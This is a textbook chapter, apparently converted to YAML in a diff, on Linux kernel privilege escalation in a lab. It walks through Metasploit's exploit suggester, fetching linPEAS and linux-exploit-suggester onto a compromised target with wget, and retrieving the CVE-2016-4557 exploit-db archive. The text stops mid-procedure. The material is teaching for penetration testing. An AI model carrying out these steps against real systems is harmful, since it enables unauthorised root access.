@@ -1,0 +1,959 @@
+- en: '*Chapter 10*: Linux Kernel Exploits'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Now that you have a functional understanding of how to elevate your privileges
+    on Windows systems, we can begin exploring the process of elevating our privileges
+    on Linux systems. The first privilege escalation attack vector we will be exploring
+    in this chapter is kernel exploitation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this chapter, you will learn how to identify, transfer, and utilize kernel
+    exploits on Linux both manually and automatically. This process will mirror the
+    same methodology we used in [*Chapter 5*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075),
+    *Windows Kernel Exploits*, where we explored the kernel exploitation process on
+    Windows.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will start by taking a look at how the Linux kernel works and how to identify
+    kernel vulnerabilities on Linux by using local enumeration scripts. After this,
+    we will explore the process of modifying, compiling, and transferring kernel exploits
+    to the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we''re going to cover the following main topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding the Linux kernel
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Kernel exploitation with Metasploit
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Manual kernel exploitation
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To follow along with the demonstrations in this chapter, you will need to ensure
+    that you have familiarity with Linux Terminal commands.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can view this chapter''s code in action here: [https://bit.ly/3igFnys](https://bit.ly/3igFnys)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding the Linux kernel
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: You should already have a good idea of how a kernel works as we took an in-depth
+    look at the structure, purpose, and functionality of a kernel in [*Chapter 5*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075),
+    *Windows Kernel Exploits*. As a result, we will only be focusing on the structure
+    of the Linux kernel and how it works in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The Linux kernel is a Unix-like open source, monolithic, and modular operating
+    system kernel that was created in 1991 by Linus Torvalds, and was later implemented
+    as the primary kernel for the GNU operating system. This combination of the Linux
+    kernel and the GNU toolchain has led to the development of a plethora of operating
+    systems that use the Linux kernel. These are commonly referred to as Linux distributions.
+    A Linux distribution is an operating system that utilizes the Linux kernel and
+    pairs it with various tools and utilities to cater to a particular use case or
+    industry.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Similar to Windows NT, the Linux kernel consists of two main modes of operation
+    that determine access to system resources and hardware:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**User space**: User space is a sector of unprivileged segregated memory that''s
+    reserved for user programs and services that run outside the operating system
+    kernel. By default, the services are segregated from the kernel and, as a result,
+    will have limited privileges.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Kernel space**: The kernel space is a privileged sector of segregated memory
+    that''s reserved for running the kernel. The kernel space is privileged, given
+    the nature of the processes and functionality the kernel is responsible for handling.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following diagram, the two main modes of operation are
+    used to segregate access to resources and hardware:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.1 – Linux kernel structure'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_001.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.1 – Linux kernel structure
+  prefs: []
+  type: TYPE_NORMAL
+- en: User space applications and services can communicate with the kernel space through
+    the use of system calls, as illustrated in the preceding diagram. The interaction
+    between the user space and kernel space is facilitated through the GNU C library
+    and, consequently, the system call interface.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The system call interface is responsible for handling system calls from user
+    space into the kernel.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The kernel space has full access to the system's hardware and resources and
+    is responsible for managing system services and system calls from the user space.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding the Linux kernel exploitation process
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The Linux kernel is vulnerable to various attacks that can lead to exploitation
+    or privilege escalation. In this chapter, we will primarily be focusing on how
+    to correctly identify and exploit vulnerabilities in the Linux kernel to elevate
+    our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Given the fact that the kernel runs in the privileged kernel space, any vulnerability
+    in the kernel that allows arbitrary code to be executed will run in a privileged
+    state and, as a result, provide us with an elevated session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This process will follow a two-pronged approach that will encompass the process
+    of utilizing kernel exploits both manually and automatically.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Kernel exploits on Linux will typically target vulnerabilities in the Linux
+    kernel to execute arbitrary code. This will help with running privileged system
+    commands or obtaining a system shell. This process will differ based on the version
+    of the Linux kernel being targeted and the kernel exploit being used.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this chapter, we will need to set up an Ubuntu 16.04 target virtual machine
+    in our virtual hacking lab.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can begin the kernel exploitation process with the Metasploit framework,
+    which will allow us to automate the process of identifying and exploiting kernel
+    vulnerabilities on Windows.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Setting up our environment
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: In this chapter, we will be utilizing a customized Ubuntu 16.04 virtual machine
+    that has been configured to be vulnerable. This will provide us with a robust
+    environment to learn about and demonstrate kernel exploitation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To start setting up the virtual machine, follow these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step in this process involves downloading the virtual machine files
+    required to set up the target system with VirtualBox. The necessary file can be
+    downloaded from [https://download.vulnhub.com/stapler/Stapler.zip](https://download.vulnhub.com/stapler/Stapler.zip).
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: After downloading the ZIP file, you will need to extract its contents. You should
+    be presented with a folder that contains the **open virtualization format** (**OVF**)
+    and **virtual machine disk** (**VMDK**) files, which are required to run the virtual
+    machine, as highlighted in the following screenshot:![Figure 10.2 – Virtual machine
+    files
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_002.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.2 – Virtual machine files
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To import the virtual machine into VirtualBox, you will need to double-click
+    the **Stapler.ovf** file. You will be prompted with the VirtualBox import wizard,
+    as illustrated in the following screenshot:![Figure 10.3 – VirtualBox import wizard
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_003.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.3 – VirtualBox import wizard
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The VirtualBox import wizard will prompt you to specify the virtual machine
+    base folder, as highlighted in the preceding screenshot. After doing this, you
+    can click on the **Import** button to begin the import process.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Once the virtual machine has been imported into VirtualBox, you will need to
+    add it to the **Virtual Hacking Lab** network we created in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
+    *Setting Up Our Lab*, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.4 – VirtualBox network settings'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_004.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.4 – VirtualBox network settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: Once you have configured the virtual machine to use the custom network, you
+    can save the changes and boot up the VM to get started.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You will require an initial foothold on the system to follow along with the
+    techniques and demonstrations in this chapter. The following exploitation guide
+    highlights the process of retrieving a meterpreter session on the target VM: [https://download.vulnhub.com/stapler/slides.pdf](https://download.vulnhub.com/stapler/slides.pdf).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have set up our environment and target virtual machine, we can begin
+    the privilege escalation process with Metasploit.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Kernel exploitation with Metasploit
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We can begin the kernel exploitation process by taking a look at how to use
+    kernel exploits with the **Metasploit** framework. The Metasploit framework offers
+    an automated and modularized solution and streamlines the exploitation process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'For this section, our target system will be the Ubuntu 16.04 virtual machine.
+    As a prerequisite, ensure that you have gained your initial foothold on the system
+    and have a **meterpreter** session:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step involves scanning the target for potential exploits. For this,
+    we will be using the **local_exploit_suggester** module. This process was covered
+    in depth in the previous chapter.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can load the module in Metasploit by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use post/multi/recon/local_exploit_suggester**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After loading the module, you will need to set the **SESSION** option for the
+    module. The **SESSION** option requires the session ID of your meterpreter session.
+    This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**set SESSION <SESSION-ID>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As illustrated in the following screenshot, the **SESSION** option should reflect
+    the session ID you set:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.5 – local_exploit_suggester options'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_005.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.5 – local_exploit_suggester options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After configuring the module options, we can run the module by running the
+    following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**run**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This will begin the scanning process, during which the module will begin to
+    output the various exploits that the target is potentially vulnerable to, as highlighted
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.6 – local_exploit_suggester results'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_006.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.6 – local_exploit_suggester results
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Now, we can begin testing the various exploit modules recommended by **local_exploit_suggester**.
+    The first few modules in the output usually have a higher chance of working successfully.
+    We can test the second module in the list, as highlighted in the preceding screenshot,
+    by loading the module. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**use /exploit/linux/local/netfilter_priv_esc_ipv4**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'This kernel exploit will exploit a **netfilter** bug on Linux kernels before
+    version 4.6.3 and requires **iptables** to be enabled and loaded. The exploit
+    also requires **libc6-dev-i386** for compiling the exploit. More information regarding
+    this exploit can be found here: [https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/).'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: After loading the module, you will need to set the module options, which will
+    include the meterpreter session ID and the payload options for the new meterpreter
+    session, as highlighted in the following screenshot:![Figure 10.7 – Kernel exploit
+    module options](Images/B17389_10_007.jpg)
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Figure 10.7 – Kernel exploit module options
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now run the kernel exploit module by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**exploit**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, the exploit was unsuccessful because **libc6-dev-i386** is not
+    installed, as seen in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.8 – Metasploit kernel exploit failed'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_008.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.8 – Metasploit kernel exploit failed
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Alternatively, running the other kernel exploits suggested by **local_exploit_suggester**
+    will fail. This is an important lesson to learn: you cannot always rely on using
+    automated Metasploit modules to gain access or elevate your privileges on the
+    target system. Trial and error is a big part of the privilege escalation process.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Given that this path has not yielded any results, we will need to take a more
+    manual hands-on approach in identifying the correct kernel exploit to use. Let's
+    begin by taking a look at how to enumerate relevant information from the target
+    system with various enumeration scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Manual kernel exploitation
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In some cases, you will not be successful in using Metasploit modules to elevate
+    your privileges, you may not have access to a target with a meterpreter session,
+    or you may have exploited the target through a manual exploitation technique such
+    as a web shell. In that case, you will have access through a standard reverse
+    shell, most likely facilitated through **netcat**. This poses a few issues; how
+    can you scan the target for potential kernel exploits? And how can you transfer
+    over the kernel exploit to the target?
+  prefs: []
+  type: TYPE_NORMAL
+- en: These are the issues we will be addressing in this section; our target of choice
+    will be the Ubuntu 16.04 virtual machine we set up earlier in this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Local enumeration tools
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The first step is to scan and identify potential kernel vulnerabilities. This
+    can be done by using **linux-exploit-suggester** or other enumeration scripts
+    and tools. In this case, we will utilize the **linPEAS** script to enumerate information
+    from our target.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: linPEAS is a local Linux enumeration script that searches and scans for potential
+    vulnerabilities, and then enumerates all important system information that can
+    be used to stage a privilege escalation attack.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The **linPEAS** binary can be downloaded from the following GitHub repository:
+    [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Ensure you download the **linpeas** Bash script, as highlighted in the following
+    screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.9 – linPEAS Bash script'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_009.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.9 – linPEAS Bash script
+  prefs: []
+  type: TYPE_NORMAL
+- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
+    file to our target virtual machine. This cannot be done automatically as we do
+    not have a meterpreter session. As a result, we will need to make use of Linux-specific
+    utilities to download the binary.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Transferring files
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'To transfer the **linpeas.sh** file to our target, we will need to set up a
+    web server on our Kali VM. This will be used to host the file so that we can download
+    it on the target system. This can be done by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **linpeas.sh** binary is stored:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: You can also use any other open port on your system if port **80** is being
+    used.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, you can utilize the Python 3 **http.server** module by running
+    the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**sudo python3 -m http.server 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, **SimpleHTTPServer** will serve
+    the files in the directory on the Kali VM IP address on port **80**:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.10 – SimpleHTTPServer linpeas.sh'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_010.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.10 – SimpleHTTPServer linpeas.sh
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To download the **linpeas.sh** file on to the target system, we can utilize
+    the **wget** utility. Before we can download the binary, however, we need to navigate
+    to a directory where we have read and write permissions. In this case, we will
+    navigate to the temporary directory, as illustrated in the following screenshot:![Figure
+    10.11 – Linux temp directory
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_011.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.11 – Linux temp directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **wget** utility to download the file from the Kali VM onto
+    our target system. This can be done by running the following command on the target
+    system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output of the preceding command can be seen in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.12 – wget successful transfer'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_012.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.12 – wget successful transfer
+  prefs: []
+  type: TYPE_NORMAL
+- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
+    file should be downloaded and saved with the name we specified.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can now use the **linpeas.sh** script to enumerate important system information
+    that we can use to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumerating system information
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'The **linpeas.sh** script enumerates a lot of information and will perform
+    various checks to discover potential vulnerabilities on the target system. However,
+    it does not enumerate a list of potential kernel exploits. In the context of kernel
+    exploits, we can use the **linpeas.sh** script to enumerate system information
+    such as the kernel version. This can be done by going through the following steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To enumerate all the important system information, we need to run the **linpeas.sh**
+    script. However, before we do that, we need to ensure the script has executable
+    permissions. This can be done by running the following command on the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**chmod +x linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now run the **linpeas.sh** script by running the following command on
+    the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**./linpeas.sh -o SysI**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The **SysI** option is used to restrict the results of the script to only system
+    information. This is primarily because the **linpeas.sh** script will generate
+    a lot of output.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As shown in the following screenshot, the script will enumerate system information,
+    the kernel version that''s been installed, and the Linux distribution release
+    version, as well as the codename:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.13 – linPEAS system information'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_013.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.13 – linPEAS system information
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this case, our target is running Ubuntu 16.04 LTS with kernel version 4.4.0-21
+    running. We can use this information to identify specific vulnerabilities that
+    affect this version of the kernel. The distribution ID, release version, and codename
+    are also important as some kernel exploits are designed to be run on specific
+    Linux distributions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **linPEAS** script does not provide us with any potential kernel exploits
+    that can be used to elevate our privileges. As a result, we will have to utilize
+    other enumeration scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **linPEAS** script enumerates a lot of useful information that will be very
+    useful in the later stages of this book as we delve into other Linux privilege
+    escalation techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumerating kernel exploits
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: We can utilize **linux-exploit-suggester** to enumerate our system information
+    and scan for potential kernel exploits. The **linux-exploit-suggester** script
+    can be downloaded from [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester).
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'It is recommended that you download the script and rename it with a simpler
+    filename. This can be automated by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+    -O les.sh
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After downloading the script, we will need to transfer it over to the target
+    system. This can be done by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **les.sh** script is stored:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To download the **les.sh** script on the target system, we can utilize the **wget**
+    utility. Before we can download the binary, however, we need to navigate to a
+    directory where we have read and write permissions. In this case, we will navigate
+    to the temporary directory, as illustrated in the following screenshot:![Figure
+    10.14 – Linux temp directory
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_014.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.14 – Linux temp directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **wget** utility to download the file from the Kali VM to
+    our target system. This can be done by running the following command on the target
+    system:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**wget http://<KALI-VM-IP>/les.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is shown in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.15 – wget successful transfer'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_015.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.15 – wget successful transfer
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As shown in the preceding screenshot, if the transfer is successful, the **les.sh**
+    script should be downloaded and saved with the name we specified.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **les.sh** script to enumerate potential kernel vulnerabilities
+    that we can use to elevate our privileges. This can be done by running the following
+    command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**./les.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As outlined in the following screenshot, the script will enumerate all potential
+    kernel exploits that can be used to elevate privileges. We can now use this information
+    to determine the correct kernel exploit to use:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.16 – Linux exploit suggester – kernel exploits'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_016.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.16 – Linux exploit suggester – kernel exploits
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: It is always recommended to use the first exploit's output with the enumeration
+    tools and scripts. In this case, we will start with the CVE-2016-4557 kernel exploit.
+    We will need to determine more information about the exploit and how it should
+    be used. We can do this by performing a quick Google search, as highlighted in
+    the following screenshot:![Figure 10.17 – CVE-2016-4557 Google search](Images/B17389_10_017.jpg)
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Figure 10.17 – CVE-2016-4557 Google search
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The preceding Google search reveals an **exploit-db** reference that contains
+    information regarding the exploit, the exploit's source code, and how it should
+    be used.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: It is always recommended to analyze the source code to ensure that it is not
+    malicious and works as intended. This allows you to make any additional modifications
+    that are required.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, we can also use the **exploit-db** command-line utility to query
+    for specific vulnerabilities. This can be done by running the following command
+    in the Kali VM:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**searchsploit linux kernel 4.4**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we are querying the **exploit-db** database for exploits specific
+    to Linux kernel version 4.4.0\. As highlighted in the following screenshot, we
+    can identify the same exploit:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.18 – Searchsploit results'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_018.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.18 – Searchsploit results
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have identified a potential kernel exploit, we can start transferring
+    the exploit to the target and execute it.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Running the kernel exploit
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Closer analysis of the kernel exploit reveals its functionality and any compilation
+    instructions (if needed), as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.19 – Exploit instructions'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_019.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 10.19 – Exploit instructions
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this particular case, we need to download the ZIP file that contains the
+    compilation script and the exploit binary to the target. After doing this, we
+    will need to run the **doubleput** binary to elevate our session.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'More information regarding this exploit can be found here: [https://www.exploit-db.com/exploits/39772](https://www.exploit-db.com/exploits/39772).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can run the kernel exploit by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in this process involves downloading the exploit archive to
+    your Kali VM. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After downloading the exploit archive, we will need to transfer it to the target
+    system. This can be done by starting a local web server on the Kali VM with the
+    **SimpleHTTPServer** Python module:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To download the binary onto the target system, we can utilize the **wget** utility.
+    Before we can download the binary, however, we need to navigate to a directory
+    where we have read and write permissions. In this case, we will navigate to the
+    temporary directory, as we have done in earlier sections.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can now use the **wget** utility to download the exploit archive from the
+    Kali VM to our target system. This can be done by running the following command
+    on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wget http://<KALI-VM-IP>/39772.zip**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After transferring the exploit archive to the target, we need to extract the
+    archive. This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**unzip 39772.zip**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After extracting the exploit archive, you will have a directory named **39772**.
+    Navigating into this directory reveals the following files:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.20 – Exploit archive contents'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_020.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 10.20 – Exploit archive contents
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Now, we need to extract the **exploit.tar** archive. This can be done by running
+    the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**tar xf exploit.tar**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After extracting the **exploit.tar** archive, you will be presented with a
+    directory, as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 10.21 – Exploit directory'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_10_021.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
